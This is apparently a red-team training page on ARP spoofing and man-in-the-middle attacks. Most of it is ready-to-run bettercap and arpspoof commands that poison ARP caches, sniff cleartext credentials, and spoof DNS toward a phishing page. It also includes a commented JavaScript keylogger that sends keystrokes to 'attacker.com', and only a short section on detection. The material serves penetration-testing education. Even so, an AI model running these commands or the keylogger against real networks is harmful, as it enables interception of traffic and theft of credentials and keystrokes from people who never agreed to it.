---
layout: training-page
title: "ARP Spoofing & Bettercap — Red Team Academy"
module: "Network Attacks"
tags:
  - arp
  - mitm
  - bettercap
  - network
  - credential-sniffing
page_key: "network-arp-mitm"
render_with_liquid: false
---

# ARP Spoofing & Bettercap

ARP (Address Resolution Protocol) has no authentication — any host can claim to own any IP address. ARP spoofing poisons the ARP cache of targets to redirect their traffic through the attacker, enabling MITM interception of cleartext protocols, credential capture, and traffic manipulation. Bettercap is the modern toolkit for this.

## How ARP Spoofing Works

```
Normal:
  Victim (192.168.1.5) → ARP: "Who has 192.168.1.1 (gateway)?"
  Gateway             → ARP reply: "192.168.1.1 is at AA:BB:CC:DD:EE:01"

Poisoned:
  Victim (192.168.1.5) → ARP: "Who has 192.168.1.1?"
  Attacker            → ARP reply: "192.168.1.1 is at AA:BB:CC:DD:EE:ATTACKER"
  Gateway (192.168.1.1) → ARP reply: "192.168.1.5 is at AA:BB:CC:DD:EE:ATTACKER"

Result:
  Victim → Attacker → Gateway (attacker sees all victim traffic)
  Gateway → Attacker → Victim (attacker sees all return traffic)
```

## Bettercap Setup

```bash
# Install
apt install bettercap
# Or build from source: github.com/bettercap/bettercap

# Launch interactive REPL
bettercap -iface eth0

# Launch with a caplet (script)
bettercap -iface eth0 -caplet arp-spoof.cap

# Launch with eval commands inline
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.5; arp.spoof on; net.sniff on"
```

## ARP Poisoning

```bash
# Inside bettercap REPL:

# Discover hosts on subnet
net.probe on
net.show

# Spoof a specific target (victim) → redirect to attacker
set arp.spoof.targets 192.168.1.5
arp.spoof on

# Spoof entire subnet (noisier — use carefully)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Enable IP forwarding to avoid dropping traffic (run as root on host)
# bettercap does this automatically, but verify:
cat /proc/sys/net/ipv4/ip_forward
# Must be 1

# Monitor active spoofing sessions
arp.spoof stats
```

## Credential Sniffing

```bash
# Start sniffer — captures cleartext credentials automatically
net.sniff on

# Bettercap auto-parses and displays credentials from:
# HTTP Basic Auth, FTP, Telnet, SMTP, POP3, IMAP, LDAP (cleartext)
# Also parses NTLM challenges/responses, Kerberos tickets

# Filter to specific protocols
set net.sniff.filter tcp port 21 or tcp port 23 or tcp port 80
net.sniff on

# Log to file
set net.sniff.output /tmp/capture.pcap
net.sniff on

# View captured credentials
net.sniff show
```

## HTTP/HTTPS Proxy

```bash
# Inject HTTP proxy to intercept and modify web traffic
http.proxy on

# HTTPS — requires SSL stripping or cert injection
# Note: HSTS preloading makes SSL stripping ineffective on modern sites
https.proxy on

# Custom JavaScript injection into HTTP responses
set http.proxy.script inject.js
http.proxy on

# Example inject.js — keylogger injection
# (run only on authorized targets)
# window.addEventListener('keydown', function(e) {
#   new Image().src = 'http://attacker.com/log?k=' + e.key;
# });
```

## DNS Spoofing

```bash
# Redirect DNS queries for specific domains to attacker-controlled IP
set dns.spoof.domains target-internal-app.corp.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# Redirect all DNS to attacker (rogue DNS server)
set dns.spoof.all true
dns.spoof on

# Use with a phishing page on 192.168.1.100 for credential capture
```

## Bettercap Caplets (Scripts)

```bash
# caplet file: arp-full.cap
net.probe on
sleep 3
net.show
set arp.spoof.targets 192.168.1.5,192.168.1.6
arp.spoof on
set net.sniff.output /tmp/session.pcap
net.sniff on
set http.proxy on

# Run caplet
bettercap -iface eth0 -caplet arp-full.cap

# Community caplets
# github.com/bettercap/caplets
# Notable: pita.cap (full MITM automation), steal-cookies.cap
```

## Arpspoof (Legacy / Simple)

```bash
# Classic arpspoof — simpler but less capable than bettercap
apt install dsniff

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof gateway for victim
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1

# Spoof victim for gateway (bidirectional — run both)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5

# Capture with tcpdump
tcpdump -i eth0 -w /tmp/capture.pcap host 192.168.1.5
```

## Passive Sniffing (No ARP Required)

```bash
# On a switch port in promiscuous mode (limited — only broadcast + own traffic)
# More effective on hubs or if you've compromised a switch/router

# Bettercap passive sniff
set net.sniff.promiscuous true
net.sniff on

# tcpdump passive
tcpdump -i eth0 -w capture.pcap

# Wireshark filter for credentials
# Display filter: http.authorization || ftp || telnet || smtp.auth
```

## Detection Signals

```
ARP cache poisoning produces:
- Duplicate IP/MAC entries in ARP tables
- Unusual ARP reply frequency (gratuitous ARPs)
- MAC address of default gateway changes
- Detection tools: arpwatch, XArp, dynamic ARP inspection (on managed switches)
```

## Resources

- Bettercap — `bettercap.org` / `github.com/bettercap/bettercap`
- MITRE T1557.002 — ARP Cache Poisoning — `attack.mitre.org/techniques/T1557/002/`
- MITRE T1040 — Network Sniffing — `attack.mitre.org/techniques/T1040/`
- dsniff suite — `monkey.org/~dugsong/dsniff/`
